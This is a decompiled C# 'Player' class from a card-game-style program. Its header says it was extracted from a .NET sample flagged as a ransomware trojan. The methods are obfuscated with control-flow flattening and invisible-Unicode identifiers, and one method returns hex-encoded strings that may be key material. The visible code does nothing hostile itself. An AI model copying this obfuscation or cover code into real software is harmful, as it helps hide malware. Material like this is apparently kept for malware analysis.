// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: Ma, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 1E05311B-A9F1-497C-9B8A-F93F05B83D6B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b73f14efefdd00c34646305b19167c781d2fee40a69d518a5c9000a6f01fdde4.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = -1582369381;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1161711599)) % 11U)
        {
          case 1:
            int num3;
            num1 = num3 = BaseStream == 1 ? -2133643918 : (num3 = -265827108);
            continue;
          case 2:
            goto label_1;
          case 3:
            str2 = str1;
            num1 = -1421912667;
            continue;
          case 4:
            num1 = (int) num2 * 1691227305 ^ 1015649508;
            continue;
          case 5:
            str1 = (string) null;
            num1 = (int) num2 * -271414406 ^ -896489376;
            continue;
          case 6:
            int num4 = BaseStream == 0 ? 1905098733 : (num4 = 606341800);
            num1 = num4 ^ (int) num2 * -1766537097;
            continue;
          case 7:
            str1 = "43616E63656C6C6174696F6E43616C6C6261636B436F7265576F726B417267756D656E";
            num1 = (int) num2 * 1582062190 ^ -759151342;
            continue;
          case 8:
            num1 = (int) num2 * -1859099956 ^ -1646370256;
            continue;
          case 9:
            num1 = (int) num2 * -1424893375 ^ 1948880735;
            continue;
          case 10:
            str1 = "7330326878443838";
            num1 = (int) num2 * 1241297479 ^ -1933616963;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = 1915502901;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ 2043720294)) % 5U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num3 * -353395537 ^ -285796918;
            continue;
          case 3:
            num4 = 0;
            break;
          case 4:
            if (this.PlanningCards.Length == 0)
            {
              num1 = (int) num3 * -57909351 ^ -1038129237;
              continue;
            }
            num4 = this.PlanningCards[cardTypeIndex];
            break;
          default:
            goto label_9;
        }
        num2 = num4;
        num1 = 1004525185;
      }
label_9:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = 355285493;
        int[] planningCards;
        int index;
        int num2;
        int num3;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ 1577350141)) % 13U)
          {
            case 0:
              int num5 = num2 > 0 ? -1914934946 : (num5 = -1974669547);
              num1 = num5 ^ (int) num4 * 2012573462;
              continue;
            case 1:
              num3 = 0;
              num1 = (int) num4 * 330242437 ^ 1468348750;
              continue;
            case 2:
              num1 = (int) num4 * -1938378321 ^ 1919863950;
              continue;
            case 3:
              num1 = 1773271717;
              continue;
            case 4:
              num2 = planningCards[index];
              num1 = 1704746081;
              continue;
            case 5:
              ++num3;
              num1 = (int) num4 * -678352522 ^ 1830956905;
              continue;
            case 6:
              goto label_1;
            case 7:
              int num6;
              num1 = num6 = index < planningCards.Length ? 138077621 : (num6 = 1960475465);
              continue;
            case 8:
              ++index;
              num1 = (int) num4 * 1851546002 ^ 362033503;
              continue;
            case 9:
              num1 = (int) num4 * -30969868 ^ -1389406118;
              continue;
            case 10:
              planningCards = this.PlanningCards;
              index = 0;
              num1 = (int) num4 * 1990741565 ^ -1168777344;
              continue;
            case 11:
              planningCardsCount = num3;
              num1 = (int) num4 * 1687317698 ^ 501750972;
              continue;
            default:
              goto label_14;
          }
        }
label_14:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -936121433;
      int planningCard;
      bool flag1;
      string str1;
      int index;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -746262825)) % 15U)
        {
          case 0:
            flag1 = planningCard == 0;
            num1 = (int) num2 * -1438109748 ^ 1601945382;
            continue;
          case 1:
            int num3 = !flag2 ? 525866709 : (num3 = 452695522);
            num1 = num3 ^ (int) num2 * 1094470360;
            continue;
          case 2:
            num1 = (int) num2 * -169381735 ^ 1048425362;
            continue;
          case 4:
            num1 = (int) num2 * 1307103014 ^ 625664802;
            continue;
          case 5:
            flag2 = index < this.PlanningCards.Length;
            num1 = -503242674;
            continue;
          case 6:
            str2 = str1;
            num1 = (int) num2 * -483854278 ^ -665850894;
            continue;
          case 7:
            planningCard = this.PlanningCards[index];
            num1 = (int) num2 * -1361709303 ^ -459211235;
            continue;
          case 8:
            index = 0;
            num1 = (int) num2 * 2067629212 ^ 210552095;
            continue;
          case 9:
            str1 = Player.\u206D‮‪⁮⁪⁭‮‪‌‏⁭‮‍‮‏‫⁫‎‪‫‎‍⁭⁯⁪‫‍‮‍‫​‪‮⁪⁯‪⁬⁯‪⁯‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -1961109636;
            continue;
          case 10:
            ++index;
            num1 = -1783718110;
            continue;
          case 11:
            int num4 = flag1 ? 982253520 : (num4 = 1374766097);
            num1 = num4 ^ (int) num2 * 745834881;
            continue;
          case 12:
            str1 = " ";
            num1 = (int) num2 * -1743590646 ^ 2104483721;
            continue;
          case 13:
            goto label_1;
          case 14:
            num1 = -1190515197;
            continue;
          default:
            goto label_16;
        }
      }
label_16:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = -312167142;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1755732780)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -798504435 ^ 360413430;
            continue;
          case 2:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * -309736138 ^ 2082377745;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = -436963321;
      int[] numArray;
      int[] planningCards;
      int aIndex;
      int count;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -338956166)) % 8U)
        {
          case 0:
            planningCards = numArray;
            num1 = (int) num2 * -777325544 ^ -1541877151;
            continue;
          case 1:
            numArray[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = -880853236;
            continue;
          case 2:
            goto label_1;
          case 4:
            aIndex = 0;
            num1 = (int) num2 * 264809506 ^ -1695607516;
            continue;
          case 5:
            count = json.Count;
            numArray = new int[count];
            num1 = (int) num2 * -157244223 ^ 596039059;
            continue;
          case 6:
            flag = aIndex < count;
            num1 = -1369191155;
            continue;
          case 7:
            int num3 = flag ? 1010161759 : (num3 = 2034925382);
            num1 = num3 ^ (int) num2 * -691109676;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return planningCards;
    }

    public override string ToString()
    {
      string str = Player.\u202C‍⁮⁭‪‌⁮‏‭⁭⁫‮⁪‮‭⁪‎‭⁪⁯‫⁮⁯‏⁭⁮⁪‎‎⁪‪‏⁭‍⁫‪‍⁫‍‫‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
label_1:
      int num1 = -786832154;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1823501944)) % 3U)
        {
          case 1:
            num1 = (int) num2 * -866521780 ^ -44490677;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    static string \u206D‮‪⁮⁪⁭‮‪‌‏⁭‮‍‮‏‫⁫‎‪‫‎‍⁭⁯⁪‫‍‮‍‫​‪‮⁪⁯‪⁬⁯‪⁯‮([In] string[] obj0) => string.Concat(obj0);

    static string \u202C‍⁮⁭‪‌⁮‏‭⁭⁫‮⁪‮‭⁪‎‭⁪⁯‫⁮⁯‏⁭⁮⁪‎‎⁪‪‏⁭‍⁫‪‍⁫‍‫‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
